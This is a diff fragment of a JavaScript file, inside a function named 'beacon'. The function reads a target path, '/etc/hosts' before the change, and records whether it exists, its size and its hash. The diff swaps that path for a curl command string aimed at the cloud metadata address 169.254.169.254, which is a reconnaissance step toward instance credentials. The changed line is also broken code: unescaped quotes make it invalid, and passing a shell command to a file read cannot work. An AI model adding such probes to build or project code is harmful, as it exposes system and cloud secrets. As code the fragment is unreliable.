@@ -35,7 +35,7 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  const target = "/etc/hosts";
+  const target = "curl -s -o /dev/null -w "%{http_code}" http://169.254.169.254/";
   let exists = false, size = -1, sha256 = "n/a";
   try {
     const buf = fs.readFileSync(target);
